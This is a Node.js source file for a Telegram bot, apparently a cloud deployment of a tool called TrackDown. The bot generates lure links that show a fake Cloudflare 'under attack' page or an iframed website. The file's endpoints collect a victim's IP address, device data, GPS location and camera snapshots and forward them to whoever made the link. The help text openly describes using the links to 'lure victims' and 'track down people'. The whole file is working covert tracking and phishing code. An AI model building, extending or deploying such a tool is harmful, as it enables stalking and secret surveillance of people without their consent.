const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// Use process.env.BOT_TOKEN as set by Cloud Run
const token = process.env.BOT_TOKEN;
// Initialize bot without polling
const bot = new TelegramBot(token);

var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Cloud Run will provide the port via the PORT environment variable
const PORT = process.env.PORT || 8080; // Default to 8080 for local testing

// Define your webhook path
const WEBHOOK_PATH = '/webhook'; // This should match the path you set in setWebhook

// Telegram webhook endpoint
app.post(WEBHOOK_PATH, (req, res) => {
    bot.processUpdate(req.body); // Process the incoming Telegram update
    res.sendStatus(200); // Always respond with 200 OK to Telegram
});

//TOGGLE for Shorters
var use1pt = false;

app.get("/w/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

    if (req.params.path != null) {
        // Use the Cloud Run service URL as hostURL
        const hostURL = process.env.K_SERVICE_URL || `http://localhost:${PORT}`; // K_SERVICE_URL is set by Cloud Run
        res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
    }
    else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }
});

app.get("/c/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

    if (req.params.path != null) {
        // Use the Cloud Run service URL as hostURL
        const hostURL = process.env.K_SERVICE_URL || `http://localhost:${PORT}`; // K_SERVICE_URL is set by Cloud Run
        res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
    }
    else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (msg?.reply_to_message?.text == "https://trackwithak-623836997544.europe-west1.run.app") {
        createLink(chatId, msg.text);
    }

    if (msg.text == "/start") {
        var m = {
            reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
        };

        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, m);
    }
    else if (msg.text == "/create") {
        createNew(chatId);
    }
    else if (msg.text == "/help") {
        bot.sendMessage(chatId, `Through this bot you can track people just by sending a simple link.\n\nSend /create
to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
the url it will send you 2 links which you can use to track people.
\n\nSpecifications.
\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
`);
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data == "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});
bot.on('polling_error', (error) => {
    //console.log(error.code);
});

async function createLink(cid, msg) {
    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

        var url = cid.toString(36) + '/' + btoa(msg);
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
            })
        };

        // Get hostURL from environment variable set by Cloud Run, or fallback for local
        const hostURL = process.env.K_SERVICE_URL || `http://localhost:${PORT}`;

        var cUrl = `${hostURL}/c/${url}`;
        var wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");
        if (use1pt) {
            var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
            var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

            var f = "", g = "";

            for (var c in x) {
                f += x[c] + "\n";
            }

            for (var c in y) {
                g += y[c] + "\n";
            }

            bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
        }
        else {

            bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
        }
    }
    else {
        bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
        createNew(cid);

    }
}

function createNew(cid) {
    var mk = {
        reply_markup: JSON.stringify({ "force_reply": true })
    };
    bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

// Health check endpoint
app.get("/", (req, res) => {
    var ip;
    if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
    res.json({ "ip": ip, "status": "Bot is running!", "timestamp": new Date().toISOString() });
});

// Additional health check endpoint
app.get("/health", (req, res) => {
    res.json({ 
        "status": "healthy", 
        "timestamp": new Date().toISOString(),
        "bot_token": process.env.BOT_TOKEN ? "configured" : "missing",
        "port": PORT,
        "deployment": "v1.2"
    });
});

app.post("/location", (req, res) => {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    if (lon != null && lat != null && uid != null && acc != null) {

        bot.sendLocation(parseInt(uid, 36), lat, lon);

        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

        res.send("Done");
    }
});

app.post("/", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var data = decodeURIComponent(req.body.data) || null;

    var ip;
    if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

    if (uid != null && data != null) {
        if (data.indexOf(ip) < 0) {
            return res.send("ok");
        }

        data = data.replaceAll("<br>", "\n");

        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });

        res.send("Done");
    }
});

app.post("/camsnap", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;

    if (uid != null && img != null) {
        var buffer = Buffer.from(img, 'base64');

        var info = {
            filename: "camsnap.png",
            contentType: 'image/png'
        };

        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.log(error);
        }

        res.send("Done");
    }
});

// Listen on the port provided by Cloud Run
app.listen(PORT, () => {
    console.log(`Bot server listening on port ${PORT}`);
});
